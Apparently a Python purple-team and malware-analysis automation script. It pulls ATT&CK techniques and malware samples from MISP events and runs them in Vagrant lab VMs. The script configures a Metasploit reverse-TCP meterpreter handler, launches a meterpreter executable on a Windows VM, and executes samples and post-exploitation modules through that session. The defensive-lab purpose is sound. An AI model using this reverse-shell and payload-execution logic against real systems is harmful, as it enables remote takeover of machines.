#TODO
# Implement logic for running TTPs in a sequence
# Save malware analysis logs to MISP
# Create some meaningful reports in MISP
# Replace print with rich logging

from pymisp import PyMISP, MISPEvent
import json
import jmespath
from pymetasploit3.msfrpc import MsfRpcClient
from tenacity import retry, stop_after_delay, wait_fixed
import yaml
import base64
import zipfile
import os 
from termcolor import colored
import subprocess
# from apscheduler.schedulers.background import BackgroundScheduler
import threading
from time import sleep
import argparse
from logwatcher import LogWatcher

parser = argparse.ArgumentParser(description="CLI utility for enriching MISP events with Malware Analysis and Adversary Emulation operations.")
parser.add_argument('-m', '--mode', type=str, help="Specify operation mode i.e. malware or purple", required=True)
parser.add_argument('-e', '--event-id', type=str, help="MISP Event ID", required=True)
args = parser.parse_args()

with open('config.yml', 'r') as file:
    config = yaml.safe_load(file)

MSF_SERVER = config['msf']['server']
MSF_PASSWORD = config['msf']['password']
MSF_RPC_PORT = config['msf']['rpc_port']
MSF_LHOST = config['msf']['LHOST']
MSF_LPORT = config['msf']['LPORT']
MISP_URL = config['misp']['url']
MISP_TOKEN = config['misp']['api_token']
PAYLOAD_DOWNLOAD_PATH_PURPLE = config['misp']['payload_download_path_purple']
PAYLOAD_DOWNLOAD_PATH_MALWARE = config['misp']['payload_download_path_malware']
KALI_PATH = config['virt_machines']['kali']
WIN_PURPLE_PATH = config['virt_machines']['win-purple']
WIN_MALWARE_PATH = config['virt_machines']['win-malware']
LOGS_DIR = config['misp']['logs_dir']

main_msf_session_key = 1
main_msf_session = None
msf_active = False
logwatcher = None

MSF_CLIENT = None
MISP_CLIENT = None

PAYLOAD_DOWNLOAD_PATH = None
if args.mode == 'malware':
    PAYLOAD_DOWNLOAD_PATH = PAYLOAD_DOWNLOAD_PATH_MALWARE
elif args.mode == 'purple':
    PAYLOAD_DOWNLOAD_PATH = PAYLOAD_DOWNLOAD_PATH_PURPLE

@retry(wait=wait_fixed(5))
def init_msf():
    """
    Initialize MSF Connection
    """
    try :
        client = MsfRpcClient(MSF_PASSWORD, port=MSF_RPC_PORT, server=MSF_SERVER, ssl=True)
        print_info("[*] Connected to Metasploit")
        return client
    except Exception as e:
        print_error("[-] Failed to connect to Metasploit - check if msfrpc is running")
        raise Exception("[-] Failed to connect to Metasploit")
    return None

@retry(wait=wait_fixed(5))
def init_misp():
    """
    Initialize MISP Connection
    """
    try:
        misp = PyMISP(MISP_URL, MISP_TOKEN, ssl=False)
        print_info("[*] Connected to MISP")
        return misp
    except Exception as e:
        print_error("[-] Failed to connect to MISP")
        raise Exception("[-] Failed to connect to MISP")
    return None

def read_misp_event(event_id):
    """
    Read a given MISP event
    """
    print()
    print_info(f"[*] Reading Event #{event_id}")
    event = MISP_CLIENT.get_event(event_id)
    event = event['Event']

    attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
    event_galaxy_clusters = jmespath.search("Galaxy[].GalaxyCluster[]", event)
    object_galaxy_clusters = jmespath.search("Object[].Attribute[].Galaxy[].GalaxyCluster[]", event)
    payloads = jmespath.search("Object[].Attribute[?type=='malware-sample'][]", event)
    galaxy_clusters = object_galaxy_clusters + attribute_galaxy_clusters + event_galaxy_clusters

    # Get MITRE TTPs
    print()
    print_info("[*] Found below MITRE ATT&CK TTPs:")
    for item in galaxy_clusters:
        print(f"{item['value']}")
        attck_id = item['meta']['external_id'][0]
        if args.mode == 'purple' and attck_id.startswith('T'):
            try:
                execute_attck(attck_id)
            except Exception as e:
                print_error(f'Error encountered while attempting {attck_id} - {e}')
                pass

    # Get malware samples
    print()
    print_info("[*] Found below Malware Samples")
    for item in payloads:
        download_misp_payload(item)


def download_misp_payload(payload):
    """
    Drop payload to Win VM and execute it if set to True
    """
    global main_msf_session_key
    name, hash = payload['value'].split('|')
    print_info(f"[*] Saving {name} to Windows VM.\n\tHash: {hash}")
    with open(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip', 'wb') as w_payload:
        w_payload.write(base64.b64decode(payload['data']))
    
    with zipfile.ZipFile(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip') as zip_file:
        zip_file.extractall(pwd=b"infected", path=PAYLOAD_DOWNLOAD_PATH)

    os.rename(f'{PAYLOAD_DOWNLOAD_PATH}/{hash}', f'{PAYLOAD_DOWNLOAD_PATH}/{name}')

    if args.mode == 'purple':
        sessions = MSF_CLIENT.sessions.list
        main_msf_session_key = list(sessions.keys())[0]
        print_info(f"[*] Selecting Session {main_msf_session_key}")
        shell = MSF_CLIENT.sessions.session(main_msf_session_key)
        print_info("[*] Executing payload")
        output = shell.run_shell_cmd_with_output(f"powershell.exe C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}", None)
        # vagrant_winrm(f"cd {WIN_PURPLE_PATH} && vagrant winrm --shell powershell --elevated --command 'C:\\vagrant\\payloads\\{name}'")
        print(output)
        cmd = f"C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}"
        # print_info(f"Running - {cmd}")
        # shell.runsingle(cmd)
        # shell.run_shell_cmd_with_output(cmd, end_strs)(cmd)
    elif args.mode == 'malware':
        print_info("[*] Executing Analysis Script")
        cmd = f"cd {WIN_MALWARE_PATH} && vagrant winrm --shell powershell --elevated --command 'C:\\Users\\vagrant\\vagrant_data\\analysis.ps1 {name}'"
        vagrant_winrm(cmd)


@retry(stop=stop_after_delay(600))
def meterpreter_connect():
    """
    Connect to Meterpreter (meterpreter-0.exe running on Win VM)
    """
    global main_msf_session
    global msf_active
    global main_msf_session_key
    try:
        print()
        print_info("[*] Configuring Metasploit Exploit...")
        exploit = MSF_CLIENT.modules.use('exploit', 'multi/handler')
        payload = MSF_CLIENT.modules.use('payload', 'windows/meterpreter/reverse_tcp')
        payload['LHOST'] = MSF_LHOST
        payload['LPORT'] = MSF_LPORT

        console_id = MSF_CLIENT.consoles.console().cid
        console = MSF_CLIENT.consoles.console(console_id)
        print_info("[*] Listening for connections...")
        console.run_module_with_output(exploit, payload=payload)

        sessions = MSF_CLIENT.sessions.list
        main_msf_session_key = list(sessions.keys())[0]
        main_msf_session = sessions[main_msf_session_key]
        print()
        print_info("[*] Connection successful\n")
        print_info(f"[*] Selecting Session {main_msf_session_key}")
        shell = MSF_CLIENT.sessions.session(main_msf_session_key)
        print_info("[*] Testing shell command\n")
        print(shell.run_shell_cmd_with_output("net accounts", None))
        msf_active = True
    except Exception:
        print_error("[-] Connection Failed, retrying...")
        raise Exception

def execute_attck(attck_id):
    """
    Execute a Metasploit Purple module that is named as the given ATT&CK ID
    """
    print_info(f"[+] Executing {attck_id.capitalize()}")
    exploit = MSF_CLIENT.modules.use('post', f'windows/purple/{attck_id.lower()}')
    exploit['SESSION'] = int(main_msf_session_key)
    console_id = MSF_CLIENT.consoles.console().cid
    console = MSF_CLIENT.consoles.console(console_id)
    output = console.run_module_with_output(exploit)
    print(output)

def print_error(msg):
    print(colored(msg, 'red'))

def print_info(msg):
    print(colored(msg, 'green'))

def vagrant_cmd(template_path, vagrant_cmd):
    """
    Run a Vagrant cmdlet. Eg. - vagrant up
    """
    cmd = f"cd {template_path} && vagrant {vagrant_cmd}"
    print_info(f"Running: {cmd}" )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    # print(result)

def vagrant_winrm(cmd):
    # powershell_cmd = f"cd {WIN_PURPLE_PATH} && vagrant winrm --shell powershell --elevated --command '{powershell_cmd}'" 
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)

def cleanup(mode):
    print_info("Cleaning Up...")
    subprocess.run(f'rm -rf {LOGS_DIR}/*', shell=True)
    subprocess.run(f'rm -rf {PAYLOAD_DOWNLOAD_PATH_MALWARE}/*', shell=True)
    subprocess.run(f'rm -rf {PAYLOAD_DOWNLOAD_PATH_PURPLE}/*', shell=True)
    if mode == 'malware':
        vagrant_cmd(WIN_MALWARE_PATH, 'halt')
    elif mode == 'purple':
        vagrant_cmd(KALI_PATH, 'halt')
        vagrant_cmd(WIN_PURPLE_PATH, 'halt')
    exit(0)
    
def main():
    global MSF_CLIENT
    global MISP_CLIENT
    global main_msf_session
    global msf_active
    global logwatcher

    MISP_CLIENT = init_misp()
    event_id = args.event_id

    if args.mode == 'purple':
        vagrant_cmd(KALI_PATH, 'up --provision')
        MSF_CLIENT = init_msf()
        thread = threading.Thread(target=meterpreter_connect)
        thread.start()                                          # Start thread to connect to meterpreter
        vagrant_cmd(WIN_PURPLE_PATH, 'up')                      # Startup Purple Win VM
        if msf_active == False:                              # Exec meterpreter till a connection is established  
            print_info("Executing Meterpreter on Victim")
            cmd = f"cd {WIN_PURPLE_PATH} && vagrant winrm --shell powershell --elevated --command 'C:\\vagrant\\meterpreter\\meterpreter-0.exe'"
            vagrant_winrm(cmd)
            sleep(60)
        print()
        read_misp_event(event_id)
        thread.join()
    
    elif args.mode == 'malware':
        vagrant_cmd(WIN_MALWARE_PATH, 'snapshot restore base')
        logwatcher = LogWatcher(LOGS_DIR, MISP_CLIENT, event_id)
        thread = threading.Thread(target=logwatcher.run)
        thread.start()
        print()
        read_misp_event(event_id)
        thread.join()
try:
    main()
except KeyboardInterrupt:
    cleanup(args.mode)
